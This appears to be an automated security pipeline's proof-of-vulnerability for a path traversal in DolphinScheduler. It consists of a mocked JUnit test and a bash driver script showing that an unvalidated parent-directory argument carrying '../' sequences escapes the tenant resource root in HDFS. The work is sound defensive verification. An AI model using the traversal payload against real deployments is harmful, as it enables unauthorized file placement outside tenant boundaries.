+/**
+ * Proof-of-Vulnerability: CWE-022 Path Traversal in the DolphinScheduler resource center.
+ *
+ * The attacker-controlled {@code currentDir} argument to
+ * {@link ResourcesServiceImpl#createDirectory} is NEVER passed through
+ * {@code FileUtils.directoryTraversal(...)} — only the leaf {@code name} is validated.
+ * As a result a benign leaf name combined with a traversal parent directory
+ * (e.g. currentDir = "/x/../../../../../../tmp/pwn") flows unchanged into the
+ * persisted {@code Resource.fullName}, which is subsequently handed to
+ * {@code HadoopUtils.getHdfsFileName(...)} / {@code HadoopUtils.mkdir(...)} — the
+ * Hadoop path-creation sink identified by the finder. The resulting HDFS path
+ * escapes the tenant resource root.
+ *
+ * This test drives the REAL {@link ResourcesServiceImpl#createDirectory} method and
+ * captures the {@link Resource} that reaches the persistence/HDFS layer.
+ *
+ * VULNERABLE (unpatched): the traversal parent directory is accepted, the resource is
+ * inserted, and its fullName contains the "/../" traversal sequence -> test passes (exit 0).
+ *
+ * PATCHED: a correct fix rejects or normalizes the traversal parent directory, so either
+ * the insert never happens (validation short-circuit) or the persisted fullName no longer
+ * contains a traversal sequence -> test fails (non-zero exit).
+ */
+@RunWith(PowerMockRunner.class)
+@PowerMockIgnore({"sun.security.*", "javax.net.*"})
+@PrepareForTest({HadoopUtils.class, PropertyUtils.class})
+public class ResourcesPathTraversalPovTest {
+
+    @InjectMocks
+    private ResourcesServiceImpl resourcesService;
+
+    @Mock
+    private ResourceMapper resourcesMapper;
+
+    @Mock
+    private TenantMapper tenantMapper;
+
+    @Mock
+    private HadoopUtils hadoopUtils;
+
+    @Mock
+    private UserMapper userMapper;
+
+    @Mock
+    private UdfFuncMapper udfFunctionMapper;
+
+    @Mock
+    private ProcessDefinitionMapper processDefinitionMapper;
+
+    @Mock
+    private ResourceUserMapper resourceUserMapper;
+
+    @Before
+    public void setUp() throws Exception {
+        // Mock ONLY HadoopUtils and PropertyUtils statics.
+        // Deliberately do NOT mock FileUtils so the real directoryTraversal() runs,
+        // demonstrating that the leaf name check exists but the parent dir check does not.
+        PowerMockito.mockStatic(HadoopUtils.class);
+        PowerMockito.mockStatic(PropertyUtils.class);
+        PowerMockito.whenNew(HadoopUtils.class).withNoArguments().thenReturn(hadoopUtils);
+        PowerMockito.when(HadoopUtils.getInstance()).thenReturn(hadoopUtils);
+    }
+
+    @Test
+    public void povParentDirPathTraversalReachesHadoopSink() throws Exception {
+        // resource upload enabled
+        PowerMockito.when(PropertyUtils.getResUploadStartupState()).thenReturn(true);
+
+        User user = new User();
+        user.setId(1);
+        user.setTenantId(1);
+
+        Tenant tenant = new Tenant();
+        tenant.setTenantCode("123");
+        Mockito.when(tenantMapper.queryById(1)).thenReturn(tenant);
+
+        // resource does not already exist, HDFS interactions succeed
+        Mockito.when(resourcesMapper.existResource(Mockito.anyString(), Mockito.anyInt(), Mockito.anyInt()))
+                .thenReturn(false);
+        Mockito.when(hadoopUtils.exists(Mockito.anyString())).thenReturn(true);
+        Mockito.when(hadoopUtils.mkdir(Mockito.anyString())).thenReturn(true);
+
+        // A perfectly benign leaf name -> passes FileUtils.directoryTraversal(name)
+        String leafName = "pov_evil_dir";
+        // Attacker-controlled PARENT directory carrying the traversal payload.
+        String maliciousParentDir = "/pov/../../../../../../../../tmp/dolphin_pwn";
+
+        // Drive the REAL service method. On unpatched code the downstream Hadoop
+        // singleton call may throw (it is only a mock), but that happens AFTER the
+        // tainted value has already been persisted and handed to the Hadoop path
+        // builder, so we swallow it and inspect what actually reached the sink.
+        try {
+            Result<Object> result = resourcesService.createDirectory(
+                    user, leafName, "pov path traversal", ResourceType.FILE, -1, maliciousParentDir);
+            System.out.println("[POV] createDirectory result = " + result.getMsg());
+        } catch (Throwable t) {
+            System.out.println("[POV] createDirectory threw after reaching sink: " + t.getMessage());
+        }
+
+        // (1) The tainted directory must have been accepted and PERSISTED. A correct
+        // patch rejects/normalises the traversal parent dir, so either insert() is
+        // never called (verification below throws) or the stored fullName no longer
+        // contains a traversal sequence (assertion below fails). Either way -> non-zero.
+        ArgumentCaptor<Resource> captor = ArgumentCaptor.forClass(Resource.class);
+        Mockito.verify(resourcesMapper, Mockito.times(1)).insert(captor.capture());
+        Resource persisted = captor.getValue();
+        String fullName = persisted.getFullName();
+        System.out.println("[POV] persisted fullName reaching Hadoop path sink = " + fullName);
+        Assert.assertTrue(
+                "Expected path-traversal sequence to survive into the resource fullName reaching "
+                        + "HadoopUtils path creation, but got: " + fullName,
+                fullName != null && fullName.contains("/../"));
+
+        // (2) The exact finder sink: HadoopUtils.getHdfsFileName(...) must have been
+        // invoked with the tainted, traversal-carrying fullName.
+        ArgumentCaptor<String> sinkArg = ArgumentCaptor.forClass(String.class);
+        PowerMockito.verifyStatic(HadoopUtils.class, Mockito.atLeastOnce());
+        HadoopUtils.getHdfsFileName(Mockito.any(ResourceType.class), Mockito.anyString(), sinkArg.capture());
+        boolean sinkTainted = false;
+        for (String v : sinkArg.getAllValues()) {
+            if (v != null && v.contains("/../")) {
+                sinkTainted = true;
+                break;
+            }
+        }
+        Assert.assertTrue(
+                "Expected the traversal fullName to reach HadoopUtils.getHdfsFileName sink, "
+                        + "captured args=" + sinkArg.getAllValues(),
+                sinkTainted);
+
+        // (3) Confirm the payload genuinely escapes the intended tenant resource root.
+        java.nio.file.Path normalized =
+                java.nio.file.Paths.get("/dolphinscheduler/123/resources" + fullName).normalize();
+        System.out.println("[POV] normalized HDFS target = " + normalized);
+        Assert.assertFalse(
+                "Expected the traversal to escape the tenant resource root: " + normalized,
+                normalized.toString().startsWith("/dolphinscheduler/123/resources/"));
+    }
+}

+# The vulnerable code (ResourcesServiceImpl.createDirectory / createResource /
+# online-create) validates only the leaf resource "name" with
+# FileUtils.directoryTraversal(...) but NEVER validates the attacker-controlled
+# parent directory ("currentDir"). A traversal payload placed in currentDir
+# therefore flows unchanged into the persisted Resource.fullName and on into
+# HadoopUtils path creation (getHdfsFileName -> new Path -> mkdir). This driver
+# exercises the REAL ResourcesServiceImpl.createDirectory method.
+#
+#   Exit 0  => vulnerable behaviour reproduced (traversal reaches the Hadoop sink).
+#   Exit !0 => behaviour blocked (a correct patch rejects/normalises the traversal).
+#
+# NOTE ON EXECUTION: this project's unit tests are JUnit4 + PowerMock, but the
+# provided container image lacks the JUnit-vintage engine, so Surefire's JUnit5
+# platform provider silently discovers 0 JUnit4 tests. We therefore compile the
+# POV together with the module and run it directly via org.junit.runner.JUnitCore.
+# The external dependency classpath was captured once (dependency:build-classpath)
+# into cp.txt; sibling DolphinScheduler modules are taken from the freshly built
+# worktree target/classes so nothing needs to be resolved from the network.
+set -euo pipefail
+
+cd /workspace/repo
+
+POV_DIR=".security-pipeline/pov"
+POV_SRC="${POV_DIR}/ResourcesPathTraversalPovTest.java"
+DEST_DIR="dolphinscheduler-api/src/test/java/org/apache/dolphinscheduler/api/service"
+DEST="${DEST_DIR}/ResourcesPathTraversalPovTest.java"
+CP_FILE="${POV_DIR}/cp.txt"
+
+cp "$POV_SRC" "$DEST"
+# Keep the product test tree clean afterwards; the canonical POV lives under .security-pipeline/pov/.
+trap 'rm -f "$DEST"' EXIT
+
+# Remove any stale (possibly jacoco-instrumented) build output without needing the
+# maven-clean-plugin, which is not cached for offline use in this image.
+find . -type d -name target -prune -exec rm -rf {} + 2>/dev/null || true
+
+# Build the reactor slice offline and compile the POV test (do not run Surefire).
+mvn -B -o -pl dolphinscheduler-api -am -DskipTests \
+    -Djacoco.skip=true -Dcheckstyle.skip=true -Drat.skip=true \
+    -Dspotbugs.skip=true -Dmaven.javadoc.skip=true \
+    package
+
+# External (non-DolphinScheduler) dependencies come from the pre-captured list;
+# every jar there lives in the image's local Maven repo.
+EXT="$(tr ':' '\n' < "$CP_FILE" | grep -v '/org/apache/dolphinscheduler/' | paste -sd: -)"
+# Sibling DolphinScheduler modules come from the freshly compiled worktree classes.
+DS="$(find . -type d -path '*/target/classes' | paste -sd: -)"
+
+CP="dolphinscheduler-api/target/test-classes:dolphinscheduler-api/target/classes:${DS}:${EXT}"
+
+echo "[POV] launching JUnitCore against ResourcesPathTraversalPovTest"
+java -cp "$CP" org.junit.runner.JUnitCore \
+    org.apache.dolphinscheduler.api.service.ResourcesPathTraversalPovTest
